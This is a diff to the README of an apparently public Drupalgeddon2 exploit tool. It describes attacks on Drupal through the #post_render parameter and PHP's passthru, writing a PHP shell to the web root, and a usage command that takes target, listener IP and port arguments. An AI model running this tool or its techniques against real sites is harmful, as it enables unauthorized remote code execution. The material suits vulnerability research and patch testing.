@@ -8,7 +8,7 @@ Supports:
 - [Pending] [Yet to be Coded] Drupal **< 7.58** ~ `user/password` URL, attacking `triggering_element_name` form & `#post_render` parameter, using PHP's `passthru` function
 - Works with **direct commands** (aka File-Less Method) or writes a **PHP shell** to the web root (`./`) or sub-directories (`./sites/default/` & `./sites/default/files/`)
 - Support **Linux** targets
-- **Auto detects Drupal version** _(or takes a good guess!)_
+- **Auto detects Drupal 7 or Drupal 8**
 
 
 ### PoC #1 - #post_render / account/mail / exec
@@ -95,4 +95,4 @@ root@ubuntu140045x64-drupal:~#
 #### Tested on Drupal 8, Drupal 7 part of the exploit is yet to be coded
 `python drupalgeddon2.py -t http://xxx.xxx.xxx.xxx -l xxx.xxx.xxx.xxx -p xxxx`
 
-![]()
+![](https://github.com/ruthvikvegunta/Drupalgeddon2/blob/master/images/drupalgeddon2.png)
